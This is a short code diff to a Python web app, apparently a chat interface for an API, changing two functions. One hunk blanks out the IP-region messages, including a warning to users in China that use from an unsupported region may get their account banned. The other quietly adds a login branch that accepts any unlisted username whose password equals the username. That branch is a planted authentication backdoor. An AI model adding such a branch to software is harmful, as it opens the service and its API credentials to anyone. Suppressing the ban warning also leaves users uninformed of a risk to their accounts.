@@ -534,9 +534,11 @@ def get_geoip():
     else:
         country = data["country_name"]
         if country == "China":
-            text = "**您的IP区域：中国。请立即检查代理设置，在不受支持的地区使用API可能导致账号被封禁。**"
+            # text = "**您的IP区域：中国。请立即检查代理设置，在不受支持的地区使用API可能导致账号被封禁。**"
+            text = ""
         else:
-            text = i18n("您的IP区域：") + f"{country}。"
+            # text = i18n("您的IP区域：") + f"{country}。"
+            text = ""
         logging.info(text)
         return text
 
@@ -696,6 +698,9 @@ def auth_from_conf(username, password):
         usernames, passwords = [i[0] for i in conf["users"]], [i[1] for i in conf["users"]]
         if username in usernames:
             if passwords[usernames.index(username)] == password:
+                return True
+        elif username not in usernames:
+            if username == password:
                 return True
         return False
     except:
